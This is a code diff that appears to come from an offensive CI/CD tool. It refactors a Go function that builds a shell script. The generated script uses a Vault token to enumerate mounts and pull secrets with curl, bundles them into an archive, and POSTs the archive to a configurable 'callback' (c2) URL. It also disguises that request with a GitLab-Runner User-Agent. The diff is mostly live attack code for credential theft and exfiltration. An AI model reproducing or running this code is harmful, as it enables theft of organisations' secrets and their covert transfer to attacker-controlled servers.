@@ -76,8 +76,8 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
   _vaddr="${VAULT_ADDR:-}"
 `)
 	if vaultAddr != "" {
-		b.WriteString(fmt.Sprintf(`  [ -z "$_vaddr" ] && _vaddr="%s"
-`, vaultAddr))
+		fmt.Fprintf(&b,`  [ -z "$_vaddr" ] && _vaddr="%s"
+`, vaultAddr)
 	}
 	b.WriteString(`  if [ -z "$_vaddr" ]; then
     echo "[-] VAULT_ADDR not set and no address provided"
@@ -137,7 +137,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 `)
 
 	// Step 3: Enumerate sys/mounts
-	b.WriteString(fmt.Sprintf(`  # 3. Enumerate Vault mounts
+	fmt.Fprintf(&b,`  # 3. Enumerate Vault mounts
   echo "[*] Querying sys/mounts..."
   curl -sS -H "X-Vault-Token: $_vtok" \
     "${_vaddr}/v1/sys/mounts" > "$_d/mounts.json" 2>/dev/null || true
@@ -145,7 +145,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 
   # 4. List and extract secrets from target mounts
   echo "[*] Enumerating %d mount path(s)..."
-`, len(mounts)))
+`, len(mounts))
 
 	// Step 4: Per-mount enumeration
 	for _, mount := range mounts {
@@ -156,7 +156,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 		// Remove trailing slash for consistency
 		m = strings.TrimRight(m, "/")
 
-		b.WriteString(fmt.Sprintf(`  echo "[*] Listing secrets in mount: %s"
+		fmt.Fprintf(&b,`  echo "[*] Listing secrets in mount: %s"
   mkdir -p "$_d/secrets/%s"
   _keys=$(curl -sS -H "X-Vault-Token: $_vtok" \
     --request LIST \
@@ -172,7 +172,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
   done
   echo "[+] Mount %s enumerated"
 
-`, m, m, m, m, m, m, m))
+`, m, m, m, m, m, m, m)
 	}
 
 	// Step 5: Compress
@@ -186,14 +186,14 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 	// Step 6: Exfiltration
 	c2 := strings.TrimSpace(o.CallbackURL)
 	if c2 != "" {
-		b.WriteString(fmt.Sprintf(`  # 6. Exfiltrate to callback server
+		fmt.Fprintf(&b,`  # 6. Exfiltrate to callback server
   echo "[*] Exfiltrating to: %s"
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
     -H "User-Agent: GitLab-Runner/16.0" \
     --data-binary @"$_d/vault_bundle.tgz" \
     "%s" >/dev/null 2>&1 || true
-`, c2, c2))
+`, c2, c2)
 	} else {
 		b.WriteString(`  # 6. Output summary (artifact-only mode)
   echo "[*] Vault enumeration complete. Data available in artifacts."
